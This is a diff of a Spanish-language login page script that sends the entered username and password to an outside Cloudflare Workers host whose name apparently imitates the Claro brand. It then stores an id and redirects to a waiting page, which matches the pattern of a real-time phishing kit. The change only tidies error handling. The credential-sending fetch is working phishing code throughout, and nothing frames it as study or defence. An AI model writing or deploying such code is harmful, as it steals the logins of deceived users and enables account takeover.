@@ -19,32 +19,24 @@
   <script>
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
+
       const usuario = document.getElementById("usuario").value;
       const clave = document.getElementById("clave").value;
 
-      try {
-        const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ usuario, clave })
-        });
+      const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario, clave })
+      });
 
-        const data = await res.json();
+      const data = await res.json();
 
-        if (!data.ok) {
-          alert("❌ Error al enviar: " + data.error);
-          return;
-        }
-
-        // Guardamos el id temporal para el polling
-        const id = data.id;
-        localStorage.setItem("loginId", id);
-
-        // Redirigimos a la página de espera
+      if(data.ok) {
+        // Guardar ID y pasar a la página de espera
+        localStorage.setItem("loginId", data.id);
         window.location.href = "esperando.html";
-
-      } catch(err) {
-        alert("❌ Error al conectar al servidor: " + err.message);
+      } else {
+        alert("❌ Error: " + data.error);
       }
     });
   </script>
